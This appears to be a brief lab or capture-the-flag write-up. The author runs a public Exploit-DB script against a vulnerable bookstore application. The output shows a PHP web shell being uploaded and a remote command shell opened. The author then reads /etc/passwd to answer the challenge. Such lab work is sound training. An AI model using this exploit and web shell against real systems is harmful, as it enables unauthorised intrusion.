The following is a vulnerable application, all information you need to exploit it can be found online.   

Note: When you find the exploit script, put all of your input in quotes, for example "id"

---
### Details


ip = 10.10.36.71


Ran bookstore exploit from https://www.exploit-db.com/exploits/47887
```shell
python3 47887.py http://10.10.36.71                

> Attempting to upload PHP web shell...
> Verifying shell upload...
> Web shell uploaded to http://10.10.36.71/bootstrap/img/C3eWq7Fc4J.php
> Example command usage: http://10.10.36.71/bootstrap/img/C3eWq7Fc4J.php?cmd=whoami
> Do you wish to launch a shell here? (y/n): y  
RCE $ ls

```
this give a shell that allow for the runnning of commands

ran   wc -c /etc/passwd to get the number of characters in passwd 

```shell
wc -c /etc/passwd
1611 /etc/passwd

```